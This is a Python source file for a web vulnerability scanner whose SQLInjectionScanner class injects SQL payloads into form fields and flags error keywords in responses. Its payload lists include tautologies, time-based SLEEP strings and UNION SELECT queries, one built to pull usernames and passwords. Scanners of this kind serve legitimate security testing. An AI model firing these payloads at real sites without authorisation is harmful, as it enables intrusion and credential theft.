from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup
from selenium.webdriver.remote.webdriver import WebDriver
import logging


class SQLInjectionScanner:
    """
    A class to scan web forms for SQL injection vulnerabilities.
    """
    def __init__(self, driver: WebDriver):
        self.driver = driver  # Use Selenium driver from crawler
        self.payloads = [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "' UNION SELECT null--",
            "' AND 1=2 UNION SELECT @@version--"
        ]


    def test_sql_injection(self, form, url):
        """Test a form for SQL injection vulnerabilities."""
        payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 'a'='a",
            "' OR 1=1 --",
            "' UNION SELECT null, null, null --",
            "' AND 1=2 UNION SELECT username, password FROM users --",
            "' OR sleep(5) --",
        ]

        if not form.get("inputs"):
            logging.warning(f"No inputs found in form at {url}. Skipping SQLi test.")
            return False

        action = form.get("action", urljoin(url, form.get("action", "")))
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])
        data = {input_field.get("name"): "test" for input_field in inputs if input_field.get("name")}

        for payload in payloads:
            for input_name in data:
                modified_data = data.copy()
                modified_data[input_name] = payload

                try:
                    response = requests.post(action, data=modified_data) if method == "post" else requests.get(action, params=modified_data)
                    if response.status_code == 200 and any(keyword in response.text.lower() for keyword in ["error", "syntax", "sql", "database"]):
                        logging.warning(f"Potential SQLi vulnerability found at {action} with payload: {payload}")
                        print(f"Potential SQLi vulnerability found at {action} with payload: {payload}")
                        return True
                except requests.RequestException as e:
                    logging.error(f"Error testing SQLi on {action}: {e}")

        return False